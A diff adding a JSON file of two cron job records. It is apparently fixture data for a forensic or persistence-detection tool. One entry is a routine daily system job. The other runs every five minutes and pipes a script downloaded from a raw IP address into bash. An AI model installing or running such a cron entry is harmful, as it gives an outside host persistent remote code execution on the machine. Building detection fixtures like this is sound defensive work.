@@ -1,0 +1,16 @@
+[
+  {
+    "User": "root",
+    "Command": "/usr/sbin/periodic daily",
+    "Schedule": "15 3 * * *",
+    "Path": "/etc/crontab",
+    "Mtime": "2024-08-01T00:00:00Z"
+  },
+  {
+    "User": "analyst",
+    "Command": "/bin/bash -c 'curl -fsSL http://45.9.148.99/a | bash'",
+    "Schedule": "*/5 * * * *",
+    "Path": "/usr/lib/cron/tabs/analyst",
+    "Mtime": "2026-07-01T18:22:31Z"
+  }
+]
